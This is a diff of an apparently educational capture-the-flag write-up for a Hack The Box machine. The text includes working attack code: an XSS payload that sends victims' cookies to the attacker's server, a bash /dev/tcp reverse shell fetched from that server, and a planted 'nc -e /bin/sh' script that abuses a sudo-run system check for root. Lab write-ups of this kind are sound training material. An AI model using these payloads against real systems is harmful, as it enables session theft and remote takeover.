@@ -66,7 +66,7 @@ For this attack we need the following ingredients:
 
 ##### 1. Setting up the server
 
-The purpose of this step is to set up a server (`server1`) to receive the stolen cookie. Use a basic HTTP server on port 8001 (you can choose whichever port you want, but be consistent) that will log incoming requests. The server listens for incoming HTTP requests. In this attack, it will receive requests containing the victim's cookies. Type in a new CLI:
+The purpose of this step is to set up a server (`server1`) to receive the stolen cookie. Use a basic HTTP server on port 8001 (you can choose whichever port you want, just be consistent) that will log incoming requests. The server listens for incoming HTTP requests, it will receive requests containing the victim's cookies. Type in a new CLI:
 
 ```
 python3 -m http.server 8001
@@ -76,25 +76,25 @@ python3 -m http.server 8001
 
 ##### 2. Configure Burp-suite scanner
 
-Open Burp-suite scanner. Click on "Temporary project in memory", "Next", "Use Burp defaults", "Start Burp". Click on `Proxy` tab, then on ìntercept is off` to set it on. You will have an outcome as follows:
+Open Burp-suite scanner. Click on "Temporary project in memory", "Next", "Use Burp defaults", "Start Burp". Click on `Proxy` tab, then on `ìntercept is off` to set it on. You will have an outcome as follows:
 
 (pic10)
 
-Click on "Open browser". A browser will appear on your left. This explorer is designed to interact with Burp-suite so we will use it for the XSS.
+Click on "Open browser". A browser will appear on your left. This explorer is designed to interact with Burp-suite. We will use it for the XSS.
 
 (pic11)
 
-Type in the search bar `http://10.10.11.8:5000/support`. You will observe that the page is freezed. This is because Burp-suite is not allowing the packets to continue. To land in the URL click on "Forward" button.
+Type in the search bar `http://10.10.11.8:5000/support`. You will observe that the page is freezed. When Burp Suite's proxy is set to intercept HTTP requests, it captures each HTTP request sent by your browser before it reaches the target server. This allows you to review, modify, or drop the request before it is forwarded to the target server. Click on "Forward" button.
 
 (pic12)
 
-You will see that the URL is reached. Introduce some random data into the webpage. Submit. Check the outcome on the right-hand side. That's all the packet information. Right-click on the packet information and select "send to repeater" so we will be able to try multiple things without recatch the packets each time. Now time to inject the payload. 
+You will see that the URL is reached. Introduce some random data into the webpage. Submit. Check the outcome on the right-hand side. Burp-suite's right window is where you can play with the request/response information. Right-click on the request information and select "send to repeater" so we will be able to try multiple things without recatching the request several times. Now time to inject the payload. 
 
 ```
 <script>var i=new Image(); i.src="http://{IP}:{port}/?cookie="+btoa(document.cookie);</script>
 ```
 
-Observe the terms `{IP}:{port}`in the previous command line (CL). The CL is generic and won't work. You have to find your IP address and use the port of the server built in step 1. To know your IP address type in a new terminal `ifconfig` and you must see your personal IP and the IP assigned to your HTB VPN. The IP from the VPN is the one you have to use. In my situation is `10.10.14.108` so my XSS injection is `<script>var i=new Image(); i.src="http://10.10.14.108:8001/?cookie="+btoa(document.cookie);</script>`.
+Observe the terms `{IP}:{port}`in the previous command line (CL). The CL is generic and won't work. You have to find your IP address and use the port of the server built in step 1 (server1). To know your IP address type in a new terminal `ifconfig` and you must see your personal IP and the IP assigned to your HTB VPN. The IP from the VPN is the one you have to use. In my situation is `10.10.14.108` so my XSS injection is `<script>var i=new Image(); i.src="http://10.10.14.108:8001/?cookie="+btoa(document.cookie);</script>`.
 
 Introduce this CL into Burp-suite in `User-Agent` field and forward the communication. If no results appear add it too into the `message` field and click on forward.
 
@@ -104,7 +104,7 @@ You will receive the following outcome in your server CLI:
 
 (pic13)
 
-Congratulations! You got the admin cookie. Now you have to decode it. Your XSS-injection script was encoded in binary 64 ensuring safe transmission via URL. So now you have to decode it. For that open a new CLI and run: 
+Congratulations! You got the admin cookie. Now you have to decode it. Your XSS-injection script was encoded in binary 64 to ensure a safe transmission via URL. So now you have to decode it. For that open a new CLI and run: 
 
 ```
 echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
@@ -121,13 +121,13 @@ Introduce the following fields: `Cache-Control: max-age=0` and `Cookie: {cokie d
 
 (pic16)
 
-In the context of a penetration test or a capture-the-flag (CTF) challenge, the goal is often to gain a shell on the target system (the webserver). This provides deeper access and control over the target, allowing the tester to explore and potentially escalate privileges further. From here the reasoning is the following:
+In the context of a penetration test or a capture-the-flag (CTF) challenge, the goal is often to gain a shell on the target system (the webserver). This provides deeper access and control over the target, allowing the tester (you) to explore and potentially escalate privileges further. From here the reasoning is the following:
 
-1. Assessing Input Fields: Exploring the web application to identify points where malicious commands can be injected.
-2. Getting a Shell: The goal is to obtain a reverse shell to gain interactive access to the target system.
+1. Assess Input Fields: Explore the web application to identify points where malicious commands can be injected.
+2. Get a Shell: The goal is to obtain a reverse shell to gain interactive access to the target system.
 3. Design Payload: A payload must be designed to open a reverse shell connection. It uses bash to create an interactive shell session that redirects input and output to the attacker's machine, effectively giving the attacker remote control over the target system.
 
-We know that we are in the correct path because we are behind a protected page that required authenticated access (admin cookie), which has higher privilege or access to more sensitive parts of the application. Getting a shell means the user can interact with the target system more freely, execute commands, and explore the environment. This is a significant step in gaining control over the system.
+We infere in a certain way that we are in the correct path because we are behind a protected page that required authenticated access (admin cookie), which has higher privilege or access to more sensitive parts of the application. Getting a shell means the user can interact with the target system more freely, execute commands, and explore the environment. This is a significant step in gaining control over the system.
 
 Open a new terminal tab and create a file `vim payload.sh` with the following content:
 
@@ -135,21 +135,21 @@ Open a new terminal tab and create a file `vim payload.sh` with the following co
 /bin/bash -c 'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'
 ```
 
-Make the payload executable with `chmod +x payload.sh`. The content:
+Make the payload executable with `chmod +x payload.sh`. The content of the payload:
 
 1. `/bin/bash -c`: Tells the CLI to run the following command using the bash shell.
-2. `'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'`: The core of the reverse shell command. `exec bash -i` This starts an interactive bash shell. `/dev/tcp/` is a Bash feature that allows TCP connections to be treated like files, when a program writes to this path it actually sends data over the network to the specified IP address and port ({IP}/1111). `0>&1`makes the standard input of the Bash shell read from the TCP connection.
+2. `'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'`: The core of the reverse shell command. `exec bash -i` starts an interactive bash shell. `/dev/tcp/` is a Bash feature that allows TCP connections to be treated like files, when a program writes to this path it actually sends data over the network to the specified IP address and port ({IP}/1111). `0>&1` makes the standard input of the Bash shell read from the TCP connection.
 
-The IP address must be your IP address (mine is `10.10.14.10`) and the /1111 is the port we are going to set (you can set whichever you want to) for a netcat listener.
+The IP address must be your IP address (mine is `10.10.14.108`) and the /1111 is the port we are going to set (you can set whichever you want to) for a netcat listener.
 
 #### Netcat
 
-Netcat network tool for reading from and writing to network connections using TCP or UDP protocols. Some of its applications include:
+Netcat is a network tool for reading from (and writing to) network connections using TCP or UDP protocols. Some of its applications include:
 
 1. Port Scanning & Banner Grabbing: Checking open ports on a network & retrieving information about a service running on an open port.
 2. File Transfers: Sending and receiving files over a network connection.
 3. Creating Backdoors: Setting up shells on target machines (out goal).
-4. Debugging and Testing Network Services: Sending and receiving arbitrary data to and from network services for testing.
+4. Debugging and Testing Network Services: Sending and receiving arbitrary data to (and from) network services for testing.
 
 To setup the netcat listener we execute:
 
@@ -161,13 +161,13 @@ nc -nvlp 1111
 
 ##### Context of the attack
 
+Once the payload is created, the steps are the following:
+
 1. The attacker runs the command `nc -nvlp 1111` on his machine to start a Netcat listener on port 1111.
-2. The payload `/bin/bash -c 'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'` is executed on the target machine. This command on the target machine opens a reverse shell, connecting back to the attacker’s machine on port 1111.
-3. The target machine connects to the attacker’s Netcat listener, establishing a reverse shell session. The attacker can now interact with the target machine’s shell through this connection.
+2. The payload `/bin/bash -c 'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'` is executed on the target machine (webserver). This command on the target machine opens a reverse shell, connecting back to the attacker’s machine on port 1111.
+3. The target machine connected to the attacker’s Netcat listener, establishes a reverse shell session. The attacker can now interact with the target machine’s shell through this connection.
 
-Let's continue with the situation. Be sure to not to close server1, it is necessary to get the payload file, server1 must be running nin the same directory as payload.sh.
-
-Go to `/dashboard` and click on "Submit" cathing the traffic with Burp-suite. Insert admin cookie to get privileges and the command that will fetch the payload created and run it.
+Let's continue with the situation. Be sure to not to close server1, it must be running in the same directory as payload.sh. Go to `/dashboard` and click on "Submit" to catch the traffic with Burp-suite. Insert `admin cookie` to get privileges and the `command that will fetch the payload` created and run it.
 
 (pic17)
 
@@ -176,7 +176,7 @@ You will see the following outcome in server1 and your netcat listener:
 (pic18)
 (pic19)
 
-This means that you accessed the webserver shell. Playing around (moving through folders) you can get the file `user.txt` where the flag is located.
+This means that you accessed the webserver shell. Playing around (moving through folders) you can get the file `user.txt` where the user flag is located.
 
 #### Root flag
 
@@ -190,14 +190,14 @@ There is a line that states "User dvir may run the following commands on headles
 
 `/usr/bin/syscheck` is a system checking script that performs several actions, among them checking if a process named `ìnitdb.sh` is running; if not, it attempts to start it.
 
-Since `syscheck` runs `initdb.sh` script, an attacker can exploit this by placing a malicious `initdb.sh` script in the directory from which the `syscheck`is executed. The plan is to insert a reverse shell ayload into the `initdb.sh` script. For that run:
+Since `syscheck` runs `initdb.sh` script, an attacker might think about exploiting this by placing a malicious `initdb.sh` script in the directory from which the `syscheck`is executed. The plan is to insert a reverse shell payload into the `initdb.sh` script. For that run in the CL:
 
 ```
 echo "nc -e /bin/sh {IP} {port}" > initdb.sh
 chmod +x initdb.sh
 ```
 
-Being {IP} and {port} your IP and port (my port in this case will be 1212). Echo prints the payload that will be executed by the webserver to return a reverse shell to us. Second line is to make the file executable.
+Being {IP} and {port} your IP and port (my port in this case will be 1212). `echo` prints the payload that will be executed by the webserver to return a reverse shell to us. Second line is to make the file executable.
 
 The execution flow is the following:
 
@@ -206,7 +206,7 @@ The execution flow is the following:
 3. `Execute syscheck`: When syscheck runs, it checks if initdb.sh is running. If it’s not, it attempts to start initdb.sh.
 4.  Reverse shell obtained.
 
-Open a new listener on the port you indicated in the payload in a new CL. On another commandline run again the `syscheck` file as follows:
+Open a new listener on the port you indicated in the payload in a new CL. On another CL run again the `syscheck` file as follows:
 
 (pic22)
 
